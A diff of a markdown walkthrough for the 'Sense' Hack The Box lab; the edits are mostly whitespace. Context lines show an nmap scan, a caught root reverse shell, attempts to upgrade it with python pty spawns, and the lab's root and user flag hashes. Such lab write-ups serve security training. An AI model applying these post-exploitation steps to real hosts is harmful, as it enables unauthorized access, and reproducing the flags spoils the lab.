@@ -36,7 +36,6 @@ sudo $(which autorecon) --dirbuster.threads 100 -vv 10.129.161.53
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Sat Sep 30 21:36:13 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80,443 sense.htb
 Nmap scan report for sense.htb (10.129.161.53)
 Host is up, received user-set (0.064s latency).
@@ -77,7 +76,6 @@ PORT    STATE SERVICE  REASON         VERSION
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sat Sep 30 21:36:34 2023 -- 1 IP address (1 host up) scanned in 20.93 seconds
 ```
 
@@ -241,25 +239,20 @@ Wow instant root
 listening on [any] 1111 ...
 connect to [10.10.16.13] from (UNKNOWN) [10.129.161.53] 11717
 sh: can't access tty; job control turned off
-
 # id
 uid=0(root) gid=0(wheel) groups=0(wheel)
-
 #
 ```
 
 ```bash
-
 # cat /root/root.txt
 d08c32a5d4f8c8b10e76eb51a69f1a86
-
 # ls -la /home
 total 16
 drwxr-xr-x   4 root   wheel     512 Oct 14  2017 .
 drwxr-xr-x  26 root   wheel     512 Oct 14  2017 ..
 drwxrwxr-x   2 root   operator  512 Oct 14  2017 .snap
 drwxr-xr-x   2 rohit  nobody    512 Oct 14  2017 rohit
-
 # cat /home/rohit/user.txt
 8721327cc232073b40d27d9c17e7348b#
 ```
@@ -287,18 +280,13 @@ Struggled a bit at getting a `tty`... Things can get weird on **OpenBSD**
 listening on [any] 1111 ...
 connect to [10.10.16.13] from (UNKNOWN) [10.129.161.53] 30618
 sh: can't access tty; job control turned off
-
 # script /dev/null -c bash
 script: not found
-
 # which script
-
 # where script
 where: not found
-
 # python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3: not found
-
 # python -c 'import pty; pty.spawn("/bin/bash")'
 Traceback (most recent call last):
   File "<string>", line 1, in <module>
@@ -320,6 +308,7 @@ And there was even no `wget` and `curl`, `nc` was a special one for openbsd syst
 I'll use the [python download trick from **gtfobins**](https://gtfobins.github.io/gtfobins/python/#file-download)
 
 > **Filetransfer CheatSheet**
+> 
 > > https://github.com/0xsyr0/OSCP#file-transfer
 {: .prompt-tip }
 
